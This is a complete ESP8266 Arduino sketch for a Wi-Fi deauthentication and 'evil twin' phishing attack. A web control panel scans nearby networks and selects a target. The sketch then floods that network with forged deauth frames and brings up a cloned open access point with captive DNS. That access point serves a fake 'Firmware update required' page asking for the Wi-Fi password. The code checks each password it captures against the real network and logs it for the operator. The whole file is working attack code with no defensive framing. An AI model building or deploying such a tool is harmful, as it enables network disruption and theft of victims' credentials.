#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include "DNSServer.h"
#include "ESPAsyncWebServer.h"
#include "FS.h"

extern "C" {
  #include "user_interface.h"
}

typedef struct
 {
     String bssid;
     String pwr;
     String ch;
     String ssid;
     String button;
     uint8_t mac[6];
 }  apObj;

apObj apTable[20];
String targetAP = "FF:FF:FF:FF:FF:FF";
uint8_t targetMac[6];
bool deauthingActive=false;
bool eviltwinActive=false;
String lastPassword = "";
uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};  

DNSServer dnsServer;
AsyncWebServer server(80);
const char HTML[] PROGMEM = "<!DOCTYPE html><html><head><style>table, th, td{font-size: 14px; padding: 4px;border: 1px solid #bfbfbf;} button {padding: 3px; margin-right:3px; }</style></head><body><h1>ESP 8266</h1><table style=\"border-collapse: collapse;\" id=\"ssidlist\"><thead><tr><th>BSSID</th><th>PWR</th><th>Ch</th><th>SSID</th><th></th></tr></thead><tbody></tbody></table><br><button onclick=\"scanSSIDs()\" id=\"scan\">Scan</button><button onclick=\"refreshSSIDs()\" id=\"refresh\">Refresh</button><button onclick=\"deauthTarget(this)\" id=\"deauth\">Start Deauth</button><button onclick=\"eviltwin(this)\" id=\"eviltwin\">Start EvilTwin</button><br><div id=\"tblDiv\"></div><script>function scanSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/scanSSIDs\", true);xhttp.send();}function refreshSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/refreshSSIDs\", true);xhttp.send();}function selectTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){refreshSSIDs();}};xhttp.open('GET', '/selectTarget?target=' + elem.parentElement.parentElement.children[0].innerText, true);xhttp.send();}function deauthTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){elem.innerHTML = this.responseText;  refreshSSIDs();}};xhttp.open('GET', '/deauthTarget', true);xhttp.send();}function eviltwin(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){  elem.innerHTML = this.responseText;}};xhttp.open('GET', '/eviltwin', true);xhttp.send();}function checkLogs(){var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200){document.getElementById(\"tblDiv\").innerHTML = this.responseText;}};xhttp.open(\"GET\", \"/checkLogs\", true);xhttp.send();} checkLogs(); </script></body></html>";
const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title></head><body><h1>Firmware update required</h1><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Confirm</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";


void onRequest(AsyncWebServerRequest *request){
    Serial.println("/");
    if (!eviltwinActive){
      request->send(200, "text/html", HTML);
    } else {
      request->send(200, "text/html", EVILTWIN);
    }
  }

void setup(){
  //your other setup stuff...
  delay(500);
  Serial.begin(115200);
  delay(500);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
  WiFi.softAP("M1z23R", "deauther");
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
  WiFi.scanNetworks();
  
  server.onNotFound(onRequest);
  
  server.on("/scanSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("scanSSIDs");
    String json = "";
    targetAP = "FF:FF:FF:FF:FF:FF";
    int n = WiFi.scanComplete();
    if(n == -2){WiFi.scanNetworks(true);} else if(n){
    for (int i = 0; i < n; ++i){
      apTable[i] = {String("<td>") +  WiFi.BSSIDstr(i) + "</td>", String("<td>") + WiFi.RSSI(i) + "</td>", String("<td>") + WiFi.channel(i) +"</td>", String("<td>") + WiFi.SSID(i) +"</td>", String("<td><button onclick=\"selectTarget(this)\">Select</button></td>")};

      for (int b = 0; b < 6; b++){
          apTable[i].mac[b] = WiFi.BSSID(i)[b];
          }
      json += String("<tr><td>") +  WiFi.BSSIDstr(i) + "</td>";json += String("<td>") + WiFi.RSSI(i) + "</td>";json += String("<td>") + WiFi.channel(i) +"</td>";json += String("<td>") + WiFi.SSID(i) +"</td>";json += String("<td><button onclick=\"selectTarget(this)\">Select</button></td></tr>");
    }
    WiFi.scanDelete();
    if(WiFi.scanComplete() == -2){WiFi.scanNetworks(true);}
    }
    WiFi.scanDelete();
    request->send(200, "text/html", json);
    json = String();});


  server.on("/refreshSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("refreshSSIDs");
    String json = "";
    for (int ap = 0; ap < 20 && apTable[ap].bssid.length() > 0; ap++){
      
      if(apTable[ap].bssid.indexOf(targetAP) > -1) {
         json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + "<td><button onclick=\"selectTarget(this)\">Deselect</button></td>" + "</tr>";
      } else {
        json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + apTable[ap].button + "</tr>";
      }
    }
   
    request->send(200, "text/html", json);
    json = String();});
  
  server.on("/selectTarget", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("selectTarget");
    if(request->hasArg("target")){
      targetAP = request->arg("target");
        for (int ap = 0; ap < 5; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            for (int b =0; b < 6; b++){
              targetMac[b] = apTable[ap].mac[b];
              deauthPacket[10+b] = apTable[ap].mac[b];
              deauthPacket[16+b] = apTable[ap].mac[b];
              }

            
          }
        }
      
      };
    request->send(200, "text/html", "OK");
    });

  server.on("/deauthTarget", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("deauthTarget");
    if (!deauthingActive && targetAP != "FF:FF:FF:FF:FF:FF"){
        Serial.println("Found target: " + targetAP);
        deauthingActive=true;
        request->send(200, "text/html", "Stop Deauth");
    } else {
      deauthingActive=false;
      request->send(200, "text/html", "Start Deauth");
    }
    });
    
  server.on("/eviltwin", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("eviltwin");
    
    if (!eviltwinActive && targetAP != "FF:FF:FF:FF:FF:FF"){
        eviltwinActive=true;
        request->send(200, "text/html", "Started EvilTwin");
        handle_AP_Changes();
    } else {
      eviltwinActive=false;
      request->send(200, "text/html", "Start EvilTwin");
    }
    });
  server.on("/checkPassword", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkPassword");
    if(request->hasArg("password")){
        String passWord = request->arg("password");
        String targetAcPo = "";
        for (int ap = 0; ap < 5; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            targetAcPo = apTable[ap].ssid;
          }
        }
        targetAcPo.remove(0,4); // trim prefix <td>
        targetAcPo.remove(targetAcPo.length() - 5,5);
        lastPassword = passWord;
        WiFi.begin(targetAcPo.c_str(), passWord.c_str());
        request->send(200, "text/html", "OK");
        
      };
    });
  
  
  server.on("/checkResult", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkResult");
    String targetAcPo = "";
    for (int ap = 0; ap < 5; ap++){
        if (apTable[ap].bssid.indexOf(targetAP) > -1){
          targetAcPo = apTable[ap].ssid;
        }
    }
    targetAcPo.remove(0,4); // trim prefix <td>
    targetAcPo.remove(targetAcPo.length() - 5,5);
        
    if(WiFi.status() != WL_CONNECTED) {
      request->send(200, "text/html", "Wrong password");
      
      File file = SPIFFS.open("/logs.txt", "a");
      if (file) {
        int bytesWritten = file.println("<tr style=\"background: red;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
        Serial.println(file);
        file.close();
      }
    } else {
      request->send(200, "text/html", "Your router will be restarted.");
      File file = SPIFFS.open("/logs.txt", "a");
      if (file) {
        int bytesWritten = file.println("<tr style=\"background: green;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
        Serial.println(file);
        file.close();
      }
      eviltwinActive = false;
      deauthingActive = false;
      handle_AP_Changes();
      
    }
});

  server.on("/checkLogs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkLogs");  
      File f = SPIFFS.open("/logs.txt", "r");
      String debugLogData;
      while (f.available()){
        debugLogData += char(f.read());
      }
      Serial.println(debugLogData);
      request->send(200, "text/html", "</br><table style=\"border-collapse: collapse; margin-top: 5px;\" id=\"tblLogs\"><thead><tr><th>SSID</th><th>Password</th></tr></thead><tbody>" + debugLogData + "<tbody></table>");
   
});

    
  SPIFFS.begin();
  server.begin();
}
void handle_AP_Changes(){
  Serial.println("handle_AP_Changes");
  if (eviltwinActive) {
     int result = WiFi.softAPdisconnect (true);
     String targetAcPo = ""; 
      for (int ap = 0; ap < 5; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            targetAcPo = apTable[ap].ssid;
            }
        }
        targetAcPo.remove(0,4);
        targetAcPo.remove(targetAcPo.length() - 5,5);
        dnsServer.stop();
        
        WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
        WiFi.softAP(targetAcPo.c_str());
        dnsServer.start(53, "*", IPAddress(192,168,4,1));
  } else {
     int result = WiFi.softAPdisconnect(true);
     dnsServer.stop();
     WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
     WiFi.softAP("M1z23R", "deauther");
     dnsServer.start(53, "*", IPAddress(192,168,4,1));
  }


}
unsigned long now =0;
void loop(){
  dnsServer.processNextRequest();
  if(deauthingActive && millis() - now >= 1000) {
    
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
   
    now = millis();
    }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    const char ZERO = '0';
    const char DOUBLEPOINT = ':';
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += ZERO;
        str += String(b[i], HEX);

        if (i < size - 1) str += DOUBLEPOINT;
    }
    return str;
}
